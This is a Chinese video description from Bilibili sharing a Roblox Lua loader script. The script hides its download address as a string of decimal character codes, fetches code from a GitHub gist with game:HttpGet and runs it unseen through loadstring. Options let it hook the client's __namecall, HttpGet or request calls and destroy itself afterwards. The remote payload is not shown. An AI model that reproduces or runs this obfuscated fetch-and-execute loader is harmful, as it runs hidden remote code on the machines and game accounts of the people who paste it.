原视频:https://www.bilibili.com/video/BV1Jet66JEEz/

视频简介:local config = {
INTERCEPTOR_MODE = 0, -- 0为自动，1为__namecall模式，2为game.HttpGet模式，3为request模式
targetPath = "https://raw.githubusercontent.com/Sc-Rhyan57/msdoors/refs/heads/main/download/main.lua", -- 这里输入带有脚本github网址，不输入也能执行
timeout = 2000, -- 测延迟节点超时延迟
selfDestruct = false -- 自毁脚本开关
}

local function d(s) local r="" for n in s:gmatch("%d+") do r=r..string.char(tonumber(n)) end return r end
local success, source = pcall(function() return game:HttpGet(d("104/116/116/112/115/058/047/047/103/105/115/116/046/103/105/116/104/117/098/117/115/101/114/099/111/110/116/101/110/116/046/099/111/109/047/082/107/120/104/105/101/106/100/098/099/107/114/110/100/047/048/099/097/048/050/052/055/049/097/049/052/052/049/097/097/057/049/102/056/054/057/097/053/048/049/054/057/050/057/102/054/099/047/114/097/119/047/102/054/102/048/051/101/100/102/049/097/101/057/101/100/101/054/052/056/100/097/097/055/100/102/048/055/101/048/051/098/102/048/057/097/100/051/097/100/049/048/047/037/050/053/069/054/037/050/053/066/055/037/050/053/066/055/037/050/053/069/054/037/050/053/066/055/037/050/053/056/054/086/050")) end)
if success and source then local fn = loadstring(source) if fn then fn(config) end end
-- V2版本

仓库链接:https://gist.githubusercontent.com/Rkxhiejdbckrnd/0ca02471a1441aa91f869a5016929f6c/raw/f6f03edf1ae9ede648daa7df07e03bf09ad3ad10/%E6%B7%B7%E6%B7%86V2